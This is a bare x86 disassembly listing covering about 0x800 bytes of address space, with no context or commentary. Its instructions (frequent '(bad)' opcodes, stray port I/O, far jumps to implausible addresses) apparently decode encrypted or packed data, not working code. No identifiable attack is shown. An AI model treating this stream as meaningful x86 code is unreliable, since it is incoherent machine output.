  40ff99:	ss clc 
  40ff9b:	je     0x41000c
  40ff9d:	aas    
  40ff9e:	test   DWORD PTR [esp+esi*2+0xe],eax
  40ffa2:	push   0x16
  40ffa4:	adc    eax,0x4f44f248
  40ffa9:	inc    ecx
  40ffaa:	or     BYTE PTR [edi+0x3d97173c],ch
  40ffb0:	fisubr WORD PTR [esp+edx*2+0x12]
  40ffb4:	test   dl,bh
  40ffb6:	ins    BYTE PTR es:[edi],dx
  40ffb7:	in     eax,dx
  40ffb8:	pop    ebx
  40ffb9:	mov    ds:0xf86e1d62,al
  40ffbe:	das    
  40ffbf:	daa    
  40ffc0:	sub    eax,0x3678e278
  40ffc5:	loop   0x40ffa4
  40ffc7:	stc    
  40ffc8:	loop   0x40ffe0
  40ffca:	nop
  40ffcb:	inc    edi
  40ffcc:	loopne 0x40fff0
  40ffce:	and    ah,BYTE PTR [ebx+ebx*8]
  40ffd1:	hlt    
  40ffd2:	test   DWORD PTR [edi],ebp
  40ffd4:	and    edx,ebx
  40ffd6:	std    
  40ffd7:	arpl   WORD PTR [esi+esi*2],di
  40ffda:	ret    
  40ffdb:	jmp    0x410045
  40ffdd:	xor    bl,BYTE PTR ds:[eax-0x1a49feba]
  40ffe4:	je     0x410009
  40ffe6:	idiv   BYTE PTR [esi]
  40ffe8:	stc    
  40ffe9:	in     al,dx
  40ffea:	jnp    0x41001c
  40ffec:	(bad)  
  40ffed:	aam    0x30
  40ffef:	jp     0x40ff7f
  40fff1:	in     al,dx
  40fff2:	dec    edi
  40fff3:	pop    ss
  40fff4:	sar    DWORD PTR ds:[ebx-0xc13d6e5],1
  40fffb:	cs pop edi
  40fffd:	(bad)  
  40fffe:	rcr    DWORD PTR [esi-0x64670d1d],0x77
  410005:	fcomp  DWORD PTR [eax-0x58]
  410008:	and    DWORD PTR [edi-0xbc14b01],0x51
  41000f:	adc    al,0xfb
  410011:	or     dl,al
  410013:	sar    DWORD PTR [esi+0x4],cl
  410016:	push   ebx
  410017:	sahf   
  410018:	arpl   ax,cx
  41001a:	push   0xffffffdb
  41001c:	fwait
  41001d:	inc    esi
  41001e:	add    ebp,edx
  410020:	sbb    esi,DWORD PTR [edx+0x31]
  410023:	xor    ch,ah
  410025:	inc    ebx
  410026:	leave  
  410027:	pusha  
  410028:	adc    eax,0x48965bb2
  41002d:	push   cs
  41002e:	test   DWORD PTR [esp+ecx*4+0x72],ecx
  410032:	popf   
  410033:	retf   0x9d9a
  410036:	pop    edx
  410037:	mov    ah,BYTE PTR [esi]
  410039:	daa    
  41003a:	mov    al,0xf0
  41003c:	out    dx,eax
  41003d:	xchg   esi,eax
  41003e:	dec    eax
  41003f:	icebp  
  410040:	mov    esp,DWORD PTR [eax+0x63]
  410043:	or     ebx,DWORD PTR [esi-0x5]
  410046:	ficomp WORD PTR [edi-0x117f6bce]
  41004c:	xchg   ecx,ebp
  41004e:	add    bl,al
  410050:	or     BYTE PTR [eax+0xb],al
  410053:	mov    eax,0x88d871c9
  410058:	ror    BYTE PTR [esi],0xf7
  41005b:	imul   esp,DWORD PTR [ecx-0x7e2dfd2b],0xa6f6b4c
  410065:	xchg   DWORD PTR [ecx],ebx
  410067:	push   edx
  410068:	mov    bl,0x91
  41006a:	xchg   ecx,eax
  41006b:	push   ss
  41006c:	jp     0x410086
  41006e:	or     bh,0x7b
  410071:	or     eax,0x9fe5b5fd
  410076:	repnz dec ebp
  410078:	or     ah,ch
  41007a:	pop    ss
  41007b:	ds inc esp
  41007d:	sub    DWORD PTR [ecx+0x6797f57],eax
  410083:	jae    0x41006b
  410085:	mov    edx,DWORD PTR [bp+si]
  410088:	pusha  
  410089:	mov    eax,0x70466798
  41008e:	fld    TBYTE PTR [edi]
  410090:	retf   
  410091:	jg     0x4100c6
  410093:	sub    al,0xcc
  410095:	loop   0x4100c0
  410097:	je     0x4100a2
  410099:	pop    eax
  41009a:	inc    eax
  41009b:	xchg   BYTE PTR [ebp+0x61ae8168],cl
  4100a1:	retf   
  4100a2:	mov    ch,0x17
  4100a4:	and    esi,DWORD PTR [esi]
  4100a6:	rol    BYTE PTR [eax+ecx*8-0x185cb02e],1
  4100ad:	in     eax,dx
  4100ae:	repz sar eax,1
  4100b1:	lds    ebp,FWORD PTR [edi-0x101a1e1e]
  4100b7:	enter  0x7fe0,0x3a
  4100bb:	lods   al,BYTE PTR ds:[esi]
  4100bc:	jle    0x4100a6
  4100be:	jmp    0x4100f7
  4100c0:	adc    eax,0xbff19367
  4100c5:	pop    esi
  4100c6:	mul    esi
  4100c8:	jecxz  0x41006f
  4100ca:	sub    DWORD PTR [edi-0x571047c1],ebx
  4100d0:	jo     0x410130
  4100d2:	mov    eax,ds:0xdb8baf6d
  4100d7:	cmp    dh,BYTE PTR [edi]
  4100d9:	pushf  
  4100da:	xchg   esp,eax
  4100db:	loop   0x410115
  4100dd:	in     eax,dx
  4100de:	imul   ebp
  4100e0:	inc    esi
  4100e1:	in     eax,0xd
  4100e3:	or     eax,ebp
  4100e5:	repnz xchg ebx,eax
  4100e7:	pop    ds
  4100e8:	and    eax,edx
  4100ea:	mov    ds:0x90254c5b,eax
  4100ef:	jnp    0x41013a
  4100f1:	add    BYTE PTR [ecx-0x1e967d69],dh
  4100f7:	xchg   edi,eax
  4100f8:	xor    bh,BYTE PTR [eax-0x23]
  4100fb:	daa    
  4100fc:	loopne 0x410127
  4100fe:	sub    DWORD PTR [edx-0x340cd01e],edx
  410104:	(bad)  
  410105:	mov    al,0xf6
  410107:	outs   dx,DWORD PTR ds:[esi]
  410108:	out    0x89,al
  41010a:	loopne 0x4100e3
  41010c:	dec    esi
  41010d:	cli    
  41010e:	inc    ebp
  41010f:	or     DWORD PTR [edi+edi*1+0x3b],esi
  410113:	xchg   BYTE PTR ds:0xea74e145,dh
  410119:	outs   dx,DWORD PTR ds:[esi]
  41011a:	rcl    DWORD PTR [edi-0x2],0x45
  41011e:	shl    BYTE PTR [ebp+0x22],1
  410121:	jle    0x4100ca
  410123:	test   bl,al
  410125:	fisttp WORD PTR [eax+0x20]
  410128:	int    0xfe
  41012a:	fwait
  41012b:	push   es
  41012c:	inc    edx
  41012d:	or     edi,DWORD PTR [ecx+0x55742a1b]
  410133:	add    BYTE PTR [esi-0x37],ch
  410136:	sbb    al,0x4d
  410138:	enter  0xdcd4,0xbc
  41013c:	mov    edi,0xb9b8f95a
  410141:	(bad)  
  410143:	test   dh,bh
  410145:	inc    ebx
  410146:	iret   
  410147:	(bad)  
  410148:	in     al,dx
  410149:	clc    
  41014a:	jmp    0x4100ee
  41014c:	mov    cl,0xc9
  41014e:	add    DWORD PTR [ebp+ebx*2-0x4a],edx
  410152:	dec    eax
  410153:	test   BYTE PTR [edi-0x4ec0c175],bl
  410159:	inc    eax
  41015a:	adc    BYTE PTR [ecx+0x4e],al
  41015d:	push   ebx
  41015e:	pop    esp
  41015f:	shl    DWORD PTR [ebx-0x383e269f],0x94
  410166:	(bad)
  410169:	sti    
  41016a:	adc    BYTE PTR [esi],bl
  41016c:	mov    ecx,0x49a36307
  410171:	leave  
  410172:	and    DWORD PTR [eax-0x18],esp
  410175:	nop
  410176:	lahf   
  410177:	daa    
  410178:	test   BYTE PTR [edx],bl
  41017a:	lods   eax,DWORD PTR ds:[esi]
  41017b:	call   0xf3e1e9c7
  410180:	retf   
  410181:	adc    al,0xf0
  410183:	xlat   BYTE PTR ds:[ebx]
  410184:	test   DWORD PTR [edi+0x42cade71],0x45840641
  41018e:	fs cli 
  410190:	stos   DWORD PTR es:[edi],eax
  410191:	imul   ebx,DWORD PTR [eiz*1-0x17e53f30],0x4a
  410199:	jno    0x410187
  41019b:	jg     0x4101fe
  41019d:	push   eax
  41019e:	dec    eax
  41019f:	inc    eax
  4101a0:	mov    esi,0xf510544e
  4101a5:	(bad)  
  4101a6:	mov    eax,ds:0xc23f62e6
  4101ab:	jnp    0x410160
  4101ad:	mov    cl,0xfc
  4101af:	jecxz  0x410188
  4101b1:	and    DWORD PTR [edi],esi
  4101b3:	mul    DWORD PTR [edx+0x3c]
  4101b6:	jnp    0x410191
  4101b8:	int    0xa8
  4101ba:	jmp    0xcedac4dd
  4101bf:	lock mov esp,ds
  4101c2:	jns    0x41015f
  4101c4:	icebp  
  4101c5:	aad    0xb1
  4101c7:	fucomp st(3)
  4101c9:	mov    ds,edi
  4101cb:	sub    eax,0x8c4e5595
  4101d0:	addr16 dec ebx
  4101d2:	js     0x41015d
  4101d4:	(bad)  
  4101d5:	loope  0x410223
  4101d7:	adc    bh,BYTE PTR [ecx]
  4101d9:	aam    0xee
  4101db:	lods   al,BYTE PTR ds:[esi]
  4101dc:	outs   dx,DWORD PTR ds:[esi]
  4101dd:	cmp    BYTE PTR [ebp-0x785cfe5e],dh
  4101e3:	xchg   esp,eax
  4101e4:	adc    bh,BYTE PTR [eax]
  4101e6:	push   esi
  4101e7:	and    bh,bh
  4101e9:	out    0x5d,eax
  4101eb:	test   eax,0x4b8ee656
  4101f0:	add    al,0xfe
  4101f2:	dec    edi
  4101f3:	daa    
  4101f4:	pop    edx
  4101f5:	xchg   esp,eax
  4101f6:	imul   esi,esp,0x27
  4101f9:	dec    esp
  4101fa:	(bad)  
  4101fb:	mul    DWORD PTR [ecx+0x7037b5ff]
  410201:	loop   0x410198
  410203:	popa   
  410204:	or     DWORD PTR [ebx+0x6a],edi
  410207:	add    eax,0xa97c5650
  41020c:	mov    eax,0xfa7a1449
  410211:	xchg   BYTE PTR [ebx],al
  410213:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410214:	mov    ds:0x84f55212,al
  410219:	inc    edi
  41021a:	inc    esp
  41021b:	sbb    BYTE PTR [eax+0x5d561a78],bh
  410221:	xchg   edx,eax
  410222:	sahf   
  410223:	mov    eax,0x7e7fec
  410228:	scas   eax,DWORD PTR es:[edi]
  410229:	std    
  41022a:	loope  0x410274
  41022c:	(bad)  
  41022d:	out    dx,al
  41022e:	inc    edi
  41022f:	adc    eax,ebp
  410231:	push   0x8192660b
  410236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410237:	outs   dx,DWORD PTR ds:[esi]
  410238:	outs   dx,BYTE PTR ds:[esi]
  410239:	xor    edi,esi
  41023b:	jp     0x4102bb
  41023d:	frstor [edx-0x3e]
  410240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410241:	scas   eax,DWORD PTR es:[edi]
  410242:	scas   eax,DWORD PTR es:[edi]
  410243:	mov    edi,0xf61e54d3
  410248:	ja     0x410223
  41024a:	mov    al,0x59
  41024c:	fbstp  TBYTE PTR [eax+eiz*8-0x359cae0]
  410253:	dec    DWORD PTR [edx+0x3]
  410256:	cli    
  410257:	(bad)  
  410258:	pandn  mm5,QWORD PTR ds:0xfb7f87f7
  41025f:	push   ss
  410260:	(bad)  
  410261:	test   DWORD PTR [ebp+0xd2dee62],0xa90800a2
  41026b:	sub    esp,edi
  41026d:	dec    esp
  41026e:	adc    DWORD PTR [edi-0x2d],ebx
  410271:	adc    dl,BYTE PTR [ebx+0x400440b5]
  410277:	stos   DWORD PTR es:[edi],eax
  410278:	jg     0x4102e6
  41027a:	fsub   DWORD PTR [edi]
  41027c:	fild   DWORD PTR [ecx+0x58d80ca9]
  410282:	cmp    eax,0x1e78d88
  410287:	lods   al,BYTE PTR ds:[esi]
  410288:	jg     0x4102f9
  41028a:	cmp    eax,0x2f7a6e9a
  41028f:	cmp    al,0xd1
  410291:	push   cs
  410292:	out    0xfb,eax
  410294:	arpl   WORD PTR [edi-0x7405011d],si
  41029a:	pop    ebp
  41029b:	mov    ds:0xcdbf7600,eax
  4102a0:	xor    eax,0x244c835f
  4102a5:	ins    BYTE PTR es:[edi],dx
  4102a6:	sbb    al,BYTE PTR [ecx+0x16]
  4102a9:	stc    
  4102aa:	mov    ebp,?
  4102ac:	retf   
  4102ad:	daa    
  4102ae:	sar    bh,1
  4102b0:	cli    
  4102b1:	mov    esp,DWORD PTR [edx]
  4102b3:	aam    0x54
  4102b5:	pop    edx
  4102b6:	mov    ebp,0xb844c67b
  4102bb:	mov    ecx,0x2ff58dd1
  4102c0:	jnp    0x41024c
  4102c2:	dec    edx
  4102c3:	in     al,0x35
  4102c5:	sub    eax,0xc63726f8
  4102ca:	push   esi
  4102cb:	mov    ecx,0xfedb1739
  4102d0:	outs   dx,BYTE PTR ds:[esi]
  4102d1:	aas    
  4102d2:	xchg   esi,eax
  4102d3:	pop    edi
  4102d4:	push   ecx
  4102d5:	sub    eax,0xb8df633b
  4102da:	scas   eax,DWORD PTR es:[edi]
  4102db:	bts    DWORD PTR [edi+0x2f],ebp
  4102df:	(bad)  
  4102e0:	and    edi,DWORD PTR [edi]
  4102e2:	in     al,dx
  4102e3:	xchg   edi,eax
  4102e4:	aam    0x66
  4102e6:	and    al,BYTE PTR [edx]
  4102e8:	mov    ds:0x3e9ef989,al
  4102ed:	mov    ah,0xe7
  4102ef:	inc    esp
  4102f0:	lds    edi,FWORD PTR [eax+0x70]
  4102f3:	jae    0x4102d1
  4102f5:	and    eax,0x584a4ed7
  4102fa:	xchg   ecx,eax
  4102fb:	inc    ebp
  4102fc:	gs mov eax,0xbd5efbae
  410302:	pop    edx
  410303:	test   BYTE PTR [esi-0x1059bbe4],0x6f
  41030a:	pop    edx
  41030b:	jle    0x4102a0
  41030d:	cld    
  41030e:	xor    al,0xe7
  410310:	fcom   QWORD PTR [edx+eax*1+0x6c]
  410314:	sbb    DWORD PTR ds:0x784ecc1,esp
  41031a:	xor    eax,DWORD PTR [edi]
  41031c:	adc    BYTE PTR [ebx],0x79
  41031f:	mov    DWORD PTR [edx+0x0],edx
  410322:	mov    DWORD PTR [edi],ebx
  410324:	inc    BYTE PTR [esi+edi*1-0x28]
  410328:	mov    ebp,0xe45921fb
  41032d:	pop    esp
  41032e:	mov    esp,0x235755b9
  410333:	ss mov ecx,0x4e7aac55
  410339:	in     eax,0xa5
  41033b:	sbb    BYTE PTR [edi],bl
  41033d:	push   esi
  41033e:	shl    BYTE PTR [ebp-0x6],1
  410341:	sbb    BYTE PTR [edx-0x5d728159],ah
  410347:	scas   al,BYTE PTR es:[edi]
  410348:	adc    eax,0xb976bfc8
  41034d:	clc    
  41034e:	sub    eax,0x3cfcde67
  410353:	loop   0x410358
  410355:	lea    ebx,[eax+0x10890aec]
  41035b:	push   0x414890d2
  410360:	adc    edi,DWORD PTR [ebx+0x14]
  410363:	fs cli 
  410365:	jae    0x4103ba
  410367:	jecxz  0x41037e
  410369:	mov    dl,0x20
  41036b:	sbb    BYTE PTR [edx+0x6c],cl
  41036e:	mov    ebp,0x15364a71
  410373:	mov    cl,0x8d
  410375:	div    DWORD PTR [ebp-0x367c6136]
  41037b:	neg    BYTE PTR ds:0xc5f764ce
  410381:	inc    ebp
  410382:	imul   edx,DWORD PTR [esi+0x6b219436],0x49
  410389:	add    eax,0x863b9f86
  41038e:	cmp    edi,ebp
  410390:	pop    edx
  410391:	cmp    DWORD PTR [edx+0x7c971f15],0xfb83f085
  41039b:	xor    BYTE PTR [esi+0x20f402e2],dl
  4103a1:	jmp    0x99cae26f
  4103a6:	inc    esp
  4103a7:	iret   
  4103a8:	sti    
  4103a9:	cli    
  4103aa:	aas    
  4103ab:	es (bad) 
  4103ad:	test   BYTE PTR [eax],dh
  4103af:	ds mov dh,0xe7
  4103b2:	imul   esi,DWORD PTR [edx-0x371f8efd],0x6a
  4103b9:	mov    ecx,0xb5456f56
  4103be:	inc    edx
  4103bf:	xor    cl,BYTE PTR [esi+0x2a1f67d5]
  4103c5:	(bad)  
  4103c6:	cmp    bh,BYTE PTR [ecx+0x53eada0a]
  4103cc:	icebp  
  4103cd:	push   ecx
  4103ce:	mov    al,0x8f
  4103d0:	mov    ebp,0x11904674
  4103d5:	pop    ebp
  4103d6:	adc    ch,BYTE PTR [edx]
  4103d8:	sub    DWORD PTR [esi+0x10f2cbf3],esi
  4103de:	jns    0x4103d7
  4103e0:	xchg   ebp,eax
  4103e1:	sbb    BYTE PTR [esi],bl
  4103e3:	cs dec ebp
  4103e5:	(bad)  
  4103e6:	sbb    eax,DWORD PTR [ebp+0x3f002e9e]
  4103ec:	adc    ecx,DWORD PTR [esi]
  4103ee:	rcr    BYTE PTR es:[ebx],cl
  4103f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103f2:	sbb    dl,dh
  4103f4:	lods   al,BYTE PTR ds:[esi]
  4103f5:	jnp    0x4103d2
  4103f7:	dec    ebp
  4103f8:	enter  0x1e0a,0x90
  4103fc:	iret   
  4103fd:	push   ss
  4103fe:	in     al,0x2f
  410400:	inc    edx
  410401:	out    dx,eax
  410402:	fimul  DWORD PTR [edi-0x35]
  410405:	test   eax,0xd022b648
  41040a:	in     eax,dx
  41040b:	or     BYTE PTR [edx],dh
  41040d:	lods   eax,DWORD PTR ds:[esi]
  41040e:	mov    al,0x9
  410410:	stc    
  410411:	in     eax,dx
  410412:	dec    ecx
  410413:	pop    es
  410414:	xor    bh,BYTE PTR [ecx+0x699afd0d]
  41041a:	or     BYTE PTR [ebp+eax*1+0x60],ch
  41041e:	inc    edi
  41041f:	mov    bl,ah
  410421:	mov    esi,0x9167bf4b
  410426:	xor    esi,eax
  410428:	or     al,0x3
  41042a:	fisub  WORD PTR [eax-0x7c]
  41042d:	cld    
  41042e:	loop   0x410413
  410430:	dec    edi
  410431:	(bad)  
  410432:	jmp    0x3e74:0xafa26fb1
  410439:	mov    ?,esi
  41043b:	je     0x4103f8
  41043d:	xor    cl,bh
  41043f:	in     al,0x79
  410441:	pop    eax
  410442:	pop    ecx
  410443:	dec    edx
  410444:	push   0x44
  410446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410447:	rol    ah,cl
  410449:	loope  0x41046f
  41044b:	mov    ecx,edx
  41044d:	sahf   
  41044e:	nop
  41044f:	add    eax,0x9c21365
  410454:	mov    al,0x20
  410456:	mov    BYTE PTR [esi],ch
  410458:	add    eax,0x5fa968b6
  41045d:	push   0x0
  41045f:	adc    BYTE PTR ds:0x3e981d30,cl
  410465:	ja     0x41042a
  410467:	aad    0x97
  410469:	dec    ebx
  41046a:	test   al,0x35
  41046c:	pop    ecx
  41046d:	cmp    cl,BYTE PTR [ebp-0x6491e5b9]
  410473:	cmc    
  410474:	inc    esp
  410475:	and    ch,bl
  410477:	inc    edi
  410478:	repz cli 
  41047a:	cmc    
  41047b:	cmc    
  41047c:	mov    edx,0xd4cc7f11
  410481:	or     al,0x5f
  410483:	mov    bl,0x10
  410485:	xchg   ebp,eax
  410486:	xchg   edi,eax
  410487:	aad    0x89
  410489:	dec    edi
  41048a:	iret   
  41048b:	mov    ch,0x4b
  41048d:	mov    ah,0x39
  41048f:	lock bound esi,QWORD PTR [edi-0x7e0eac10]
  410496:	sbb    al,0xc9
  410498:	push   esi
  410499:	aad    0xaf
  41049b:	jmp    0xc6f6999
  4104a0:	adc    eax,0x43e5433c
  4104a5:	pop    ebx
  4104a6:	dec    edi
  4104a7:	mov    dl,al
  4104a9:	imul   esp,DWORD PTR [edx],0xffffff9b
  4104ac:	in     al,0xf8
  4104ae:	rcr    BYTE PTR [ebx],0xc3
  4104b1:	push   0xc983cabd
  4104b6:	inc    ebx
  4104b7:	cmp    edx,eax
  4104b9:	pop    es
  4104ba:	xchg   esp,eax
  4104bb:	stc    
  4104bc:	sub    dh,BYTE PTR [ecx-0x2]
  4104bf:	pop    es
  4104c0:	jge    0x4104d4
  4104c2:	cmp    eax,0xfd3ebae0
  4104c7:	pop    eax
  4104c8:	push   eax
  4104c9:	pop    esp
  4104ca:	into   
  4104cb:	add    eax,0xd2cba9f
  4104d0:	std    
  4104d1:	inc    ebp
  4104d2:	push   0x1bc02f1b
  4104d7:	inc    esi
  4104d8:	into   
  4104d9:	sbb    ebp,0x47
  4104dc:	rol    ebp,cl
  4104de:	xor    eax,0x2c7ac31f
  4104e3:	jns    0x4104e5
  4104e5:	inc    cx
  4104e7:	adc    BYTE PTR [ebx+0x4f59b2f4],dl
  4104ed:	dec    esi
  4104ee:	in     al,0xca
  4104f0:	daa    
  4104f1:	mov    esi,0xeeeb8a81
  4104f6:	xchg   ebp,eax
  4104f7:	packssdw mm5,QWORD PTR [ebx+0x1e]
  4104fb:	cmp    al,0x3c
  4104fd:	and    eax,0x325e3a0b
  410502:	call   0x1a2:0xa201fe
  410509:	or     ah,bl
  41050b:	cli    
  41050c:	jmp    0x70ff7d1b
  410511:	sub    DWORD PTR [edx-0x6e770003],esi
  410517:	scas   al,BYTE PTR es:[edi]
  410518:	outs   dx,DWORD PTR ds:[esi]
  410519:	popa   
  41051a:	call   0x15e3d914
  41051f:	dec    ecx
  410520:	sbb    BYTE PTR [edx-0x68],dl
  410523:	inc    esi
  410524:	div    BYTE PTR [edi-0x70381a1d]
  41052a:	retf   
  41052b:	test   BYTE PTR [edx-0x4e],dh
  41052e:	jne    0x4105ac
  410530:	xchg   edi,eax
  410531:	lock scas al,BYTE PTR es:[edi]
  410533:	jmp    0x840a2fee
  410538:	addr16 and ebx,esp
  41053b:	addr16 push cs
  41053d:	add    BYTE PTR [ecx-0x68862a82],ah
  410543:	popa   
  410544:	hlt    
  410545:	lock mov ds:0xf7347cf2,eax
  41054b:	adc    al,0x3c
  41054d:	popf   
  41054e:	cmc    
  41054f:	jmp    0xc89a2c33
  410554:	or     al,0x44
  410556:	inc    esi
  410557:	add    al,0xc2
  410559:	jecxz  0x41055a
  41055b:	mov    es,WORD PTR [ebx]
  41055d:	push   edi
  41055e:	fisttp QWORD PTR [ebx+0x667ab7dc]
  410564:	adc    BYTE PTR ds:0x93b6059a,ah
  41056a:	jnp    0x410544
  41056c:	xlat   BYTE PTR ds:[ebx]
  41056d:	dec    ebp
  41056e:	pop    ebp
  41056f:	das    
  410570:	arpl   WORD PTR [ebx+ebp*8-0x180693bb],si
  410577:	out    dx,eax
  410578:	pusha  
  410579:	mov    edx,0xff4b1b2b
  41057e:	jbe    0x410529
  410580:	sub    BYTE PTR [edx],ch
  410582:	xchg   BYTE PTR ds:0xf85079c9,ah
  410588:	leave  
  410589:	jg     0x4105b7
  41058b:	cmp    DWORD PTR [edi-0x72],ebp
  41058e:	nop
  41058f:	push   edi
  410590:	mov    cl,0xae
  410592:	jbe    0x4105ed
  410594:	add    al,0xf4
  410596:	out    0x56,eax
  410598:	pop    edi
  410599:	pop    ebp
  41059a:	sub    eax,0x545305bc
  41059f:	test   eax,0x500f34d0
  4105a4:	mov    ecx,0xa2c905a6
  4105a9:	adc    eax,0xc3b239f2
  4105ae:	ins    BYTE PTR es:[edi],dx
  4105af:	mov    DWORD PTR [edx+0x7],eax
  4105b2:	popa   
  4105b3:	xor    BYTE PTR [edi+0x8806882],al
  4105b9:	or     BYTE PTR [edx],0xa0
  4105bc:	cmc    
  4105bd:	ret    
  4105be:	aaa    
  4105bf:	retf   
  4105c0:	repz inc ebp
  4105c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105c3:	scas   eax,DWORD PTR es:[edi]
  4105c4:	dec    ecx
  4105c5:	mov    edx,0x7db9c727
  4105ca:	dec    BYTE PTR [edi]
  4105cc:	addr16 adc al,0x7a
  4105cf:	mov    ah,0xdd
  4105d1:	sbb    DWORD PTR ds:0x73d635a9,edi
  4105d7:	outs   dx,BYTE PTR ds:[esi]
  4105d8:	and    al,0x9d
  4105da:	fxtract 
  4105dc:	imul   DWORD PTR [eax+0xb]
  4105df:	push   0x95a609f3
  4105e4:	mov    ah,0x1f
  4105e6:	(bad)  [eax+eiz*4]
  4105e9:	sbb    esi,ebp
  4105eb:	rol    DWORD PTR [esi-0x3d8107d],cl
  4105f1:	dec    edi
  4105f2:	sahf   
  4105f3:	jle    0x41060a
  4105f5:	and    eax,DWORD PTR [edi-0x6b]
  4105f8:	add    ecx,ebp
  4105fa:	fsubr  QWORD PTR [ebx+0x7a3577be]
  410600:	push   DWORD PTR [eax-0x18a1fba9]
  410606:	mov    ?,WORD PTR [eax]
  410608:	xor    eax,0xffcef39c
  41060d:	cdq    
  41060e:	in     al,0xc3
  410610:	stos   BYTE PTR es:[edi],al
  410611:	push   edx
  410612:	fstp   TBYTE PTR [ebx-0x697badee]
  410618:	leave  
  410619:	xor    dl,BYTE PTR [eax+eax*1+0x24]
  41061d:	xchg   cl,bh
  41061f:	mov    edx,0xe4349a6e
  410624:	mov    eax,0x51634b3
  410629:	(bad)  
  41062a:	cmp    edx,DWORD PTR [ebx+0x7f]
  41062d:	lahf   
  41062e:	stos   BYTE PTR es:[edi],al
  41062f:	(bad)  
  410630:	xlat   BYTE PTR ds:[ebx]
  410631:	popa   
  410632:	pop    esp
  410633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410634:	sbb    edx,ebx
  410636:	xor    al,0xd7
  410638:	mov    esp,0x569859c9
  41063d:	pop    edi
  41063e:	or     edi,edi
  410640:	pushf  
  410641:	xchg   edi,eax
  410642:	mov    edi,0xff77af22
  410647:	jmp    0x753f8795
  41064c:	jg     0x4106cb
  41064e:	test   DWORD PTR [ecx],esi
  410650:	hlt    
  410651:	mov    edi,0x5f711bfc
  410656:	daa    
  410657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410658:	stos   BYTE PTR es:[edi],al
  410659:	shr    DWORD PTR [esi-0x74],cl
  41065c:	sbb    DWORD PTR [esi],ebx
  41065e:	out    0xfa,eax
  410660:	mov    al,ds:0xcf25439b
  410665:	(bad)  
  410666:	cmc    
  410667:	repz and ebx,DWORD PTR [eax-0xb]
  41066b:	lahf   
  41066c:	xchg   ebx,eax
  41066d:	push   0x3a7e43ff
  410672:	jmp    0x2392:0x36976bc5
  410679:	adc    DWORD PTR [ecx+0x202bfef3],eax
  41067f:	fwait
  410680:	jmp    0x176ac647
  410685:	adc    dh,al
  410687:	fidiv  DWORD PTR [edi+0x46ef872f]
  41068d:	gs stc 
  41068f:	fwait
  410690:	push   ss
  410691:	retf   0x98db
  410694:	adc    eax,0x68d5735a
  410699:	cli    
  41069a:	in     al,dx
  41069b:	inc    ebx
  41069c:	mov    ebp,0xb012b59e
  4106a1:	cmp    DWORD PTR [ecx],esp
  4106a3:	xor    edx,DWORD PTR [esp+ebp*2]
  4106a6:	xchg   edx,eax
  4106a7:	sbb    BYTE PTR [edx-0x77],0x67
  4106ab:	ins    BYTE PTR es:[edi],dx
  4106ac:	pop    es
  4106ad:	ss popa 
  4106af:	pushf  
  4106b0:	pop    ebx
  4106b1:	fdivr  st(3),st
  4106b3:	cld    
  4106b4:	sti    
  4106b5:	out    dx,al
  4106b6:	inc    esi
  4106b7:	in     al,dx
  4106b8:	xchg   BYTE PTR ds:0xc5afe5f0,al
  4106be:	icebp  
  4106bf:	(bad)  
  4106c0:	dec    DWORD PTR ds:0x910b5581
  4106c6:	int3   
  4106c7:	jbe    0x410717
  4106c9:	neg    DWORD PTR [eax-0x1bf775e8]
  4106cf:	pop    ds
  4106d0:	in     al,dx
  4106d1:	fiadd  WORD PTR [eax]
  4106d3:	pop    edi
  4106d4:	int    0x5c
  4106d6:	or     al,0xf7
  4106d8:	aas    
  4106d9:	das    
  4106da:	jnp    0x4106de
  4106dc:	retf   0x73ba
  4106df:	test   DWORD PTR [ecx+eiz*1],esi
  4106e2:	pop    es
  4106e3:	inc    eax
  4106e4:	add    eax,0xf477d0
  4106e9:	stos   BYTE PTR es:[edi],al
  4106ea:	pop    ss
  4106eb:	cs pop ss
  4106ed:	aaa    
  4106ee:	sub    BYTE PTR [esi+0x3],0x73
  4106f2:	pop    es
  4106f3:	sbb    BYTE PTR [esi+0x24],cl
  4106f6:	outs   dx,DWORD PTR ds:[esi]
  4106f7:	sar    bl,0x67
  4106fa:	ja     0x410708
  4106fc:	or     ch,cl
  4106fe:	repz cdq 
  410700:	fild   QWORD PTR [esi+0x7acfc590]
  410706:	or     BYTE PTR [edi+0x7d],0xa6
  41070a:	inc    edi
  41070b:	es cwde 
  41070d:	push   ss
  41070e:	ds addr16 mov ah,0x44
  410712:	cmp    BYTE PTR [edi+0x386de9a9],al
  410718:	cmc    
  410719:	repnz fwait
  41071b:	inc    edx
  41071c:	push   cs
  41071d:	mov    dl,0x95
  41071f:	lods   eax,DWORD PTR ds:[esi]
  410720:	jmp    0xfa1ef8e6
  410725:	push   edx
  410726:	pop    DWORD PTR [eax+0x13]
  410729:	outs   dx,BYTE PTR ds:[esi]
  41072a:	int3   
  41072b:	or     ecx,DWORD PTR [eax+0x7624ecfc]
  410731:	jg     0x410718
  410733:	xlat   BYTE PTR ds:[ebx]
  410734:	enter  0x1fe9,0xcd
  410738:	and    BYTE PTR [ebx+0x36],cl
  41073b:	rol    BYTE PTR [ecx+0x0],0xba
  41073f:	cdq    
  410740:	retf   0xf36e
  410743:	les    ecx,FWORD PTR [esi+0xc]
  410746:	idiv   DWORD PTR [ebp+0x5f67de8a]
  41074c:	(bad)
  41074f:	dec    edi
  410750:	dec    eax
  410751:	mul    BYTE PTR [edx-0x35]
  410754:	test   DWORD PTR [ebp-0x10],esp
  410757:	push   esi
  410758:	cs xchg esi,eax
  41075a:	div    DWORD PTR [edx-0x31]
  41075d:	rcr    DWORD PTR ds:[ecx+0x431d96cb],cl
  410764:	aad    0xd6
  410766:	pop    esp
  410767:	test   eax,0x7c5812cc
  41076c:	test   eax,0xdf613708
  410771:	mov    ebx,edi
  410773:	cmp    eax,0x35d7b582
  410778:	mov    al,ds:0xf8b4f570
  41077d:	jge    0x410703
  41077f:	jne    0x410766
  410781:	xchg   edi,eax
  410782:	mov    esi,0xfecf9d0b
  410787:	inc    ebp
  410788:	pop    ecx
  410789:	repz ds dec ecx
  41078c:	sbb    ah,BYTE PTR [ecx+0x29]
